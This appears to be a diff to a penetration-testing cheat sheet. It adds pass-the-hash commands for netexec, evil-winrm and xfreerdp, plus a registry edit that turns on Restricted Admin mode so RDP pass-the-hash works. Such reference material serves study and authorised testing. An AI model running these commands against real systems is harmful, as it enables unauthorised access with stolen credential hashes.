@@ -650,6 +650,29 @@ $ impacket-atexec <username>@<IP address> -hashes :<hash>
 $ impacket-smbexec <username>@<IP address> -hashes :<hash>
 ```
 
+- Netexec (PTH)
+
+```
+$ netexec smb <IP address> -u <username> -d . -H <hash>
+$ netexec smb <IP address> -u <username> -d . -H <hash> -x whoami
+```
+
+- Evil-winrm (PTH)
+
+```
+$ evil-winrm -i <IP address> -u <username> -H <hash>
+$ evil-winrm -i <IP address> -u <username@domain> -H <hash>
+```
+
+- Xfreerdp (PTH)
+
+```
+# Disable Restricted Admin Mode on the target
+C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+$ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
